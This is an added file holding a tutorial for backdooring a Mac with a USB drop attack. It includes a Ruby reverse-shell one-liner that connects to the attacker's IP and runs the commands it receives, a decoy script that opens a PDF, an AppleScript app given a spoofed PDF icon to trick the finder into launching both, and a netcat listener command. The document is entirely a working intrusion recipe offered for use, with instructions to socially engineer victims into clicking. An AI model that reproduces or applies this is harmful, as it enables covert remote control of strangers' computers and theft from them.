@@ -1,0 +1,39 @@
+Backdooring a Mac with Netcat (Social Engineering)
+
+Requires a Mac or an Applescript emulator
+
+Create a PDF File, saying something along the lines of 'Please email [Email Address] if you find this USB' Name it anything. Save it into a folder named 'Private' on your USB drive.
+
+Create a new text file. Paste the code below into it:
+
+#!/bin/bash/
+
+ruby -rsocket -e "c=TCPSocket.new('1.2.3.4','9999');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"
+
+Remember to change '1.2.3.4' to the IP address of the attackers machine
+
+Save this file as TermsAndConditions.sh, and place it in the folder named 'Private'
+
+Create a second new text file. Paste the code below into it:
+
+#!/bin/bash
+
+open [Path to actual PDF file]
+
+Save this file as PrivacyPolicy.sh and place it in the 'Private' Folder
+
+Using the Applescript Editor on a Mac or an emulator for it, create a new file. Paste the code below into it:
+
+do shell script "bash [Path to TermsAndConditions.sh] & bash [Path to PrivacyPolicy.sh]"
+
+Export this file as an application, and name it something like 'Read if USB Lost'
+
+Spoof the icon. Right click on the file and click 'Get Info'. Get your PDF file icon, and drag it from it's folder into the top left corner of the 'Get Info' window. This will change the file icon. It is optional to spoof the file extension.
+
+Start a netcat terminal on your machine
+
+nc -l -p 9999
+
+Use social engineering skills to make someone click the file. It will execute, executing the two .sh scripts and making the backdoor look legitimate. Prototype files are stored in 'Prototype Files' Folder.
+
+
